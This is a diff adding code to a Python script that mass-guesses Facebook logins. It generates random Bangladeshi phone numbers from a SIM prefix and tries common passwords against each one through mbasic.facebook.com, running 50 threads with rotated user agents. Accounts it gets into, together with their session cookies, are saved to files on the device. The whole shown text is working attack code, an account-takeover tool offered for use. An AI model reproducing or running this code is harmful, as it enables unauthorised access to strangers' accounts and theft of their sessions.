@@ -274,4 +274,162 @@ def admin():
 	if bal =='0':
 		Main()
 	
-def virus():                                                              
+def virus():
+    user=[]
+	os.system('clear')
+	print(logo)
+	print(" Sim code Example : 016, 017, 018, 013, 019")
+	kode = input(' [💀] Enter sim code: ')
+	doamin = ' BD Number id cloner [CP-OK MIX] '
+	limit = int(input('[?] Number add Limit : '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=50) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print(' [🔥]  Total ids:\033[1;92m '+tl)
+		print(f' [🔥]  Usaragents : '+str(len(ugen)))
+		print(f' [🔥]\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [🔥]  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[🔥]  The process has been started')
+		print(' [🔥]  use airplane mode if ok ids not come ')
+		print(50*'_')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			yaari.submit(a,uid,pwx,tl)
+	print(50*'_')
+	print(' [🔥] Crack process has been completed')
+	print(' [🔥] Ids saved in ok.txt,cp.txt')
+	print(50*'_')
+	exit()
+def virus2():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" Sim code Example : 016, 017, 018, 013,  019")
+	kode = input(' [★] Enter sim code: ')
+	doamin = ' BD Number id cloner [ONLY-OK] '
+	limit = int(input('[?] How many numbers do you want to add : '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=50) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print(' [😸  Total ids:\033[1;92m '+tl)
+		print(f' [😸  Usaragents : '+str(len(ugen)))
+		print(f' [😸\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [😸  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[😸  The process has been started')
+		print(' [😸  use airplane mode if ok ids not come ')
+		print(50*'_')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			yaari.submit(b,uid,pwx,tl)
+	print(50*'_')
+	print(' [😸 Crack process has been completed')
+	print(' [😸 Ids saved in ok.txt,cp.txt')
+	print(50*'_')
+	exit()
+def virus3():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" Sim code Example : 016, 017, 018, 019")
+	kode = input(' [💀] Enter sim code: ')
+	doamin = ' BD Number id cloner [APK] '
+	limit = int(input('[?] How many numbers do you want to add : '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=50) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print(' [😳]  Total ids:\033[1;92m '+tl)
+		print(f' [😳]  Usaragents : '+str(len(ugen)))
+		print(f' [😳]\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [😳]  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[😳]  The process has been started')
+		print(' [😳]  use airplane mode if ok ids not come ')
+		print(50*'_')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			yaari.submit(c,uid,pwx,tl)
+	print(50*'_')
+	print(' [😳] Crack process has been completed')
+	print(' [😳] Ids saved in ok.txt,cp.txt')
+	print(50*'_')
+	exit()
+def a(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMRX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            #oo=random.choice(sss)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
+                open('/sdcard/MRX-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\r\x1b[38;5;196m[cp] {uid}|{ps}")
+                open('/sdcard/MRX-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)                                                              
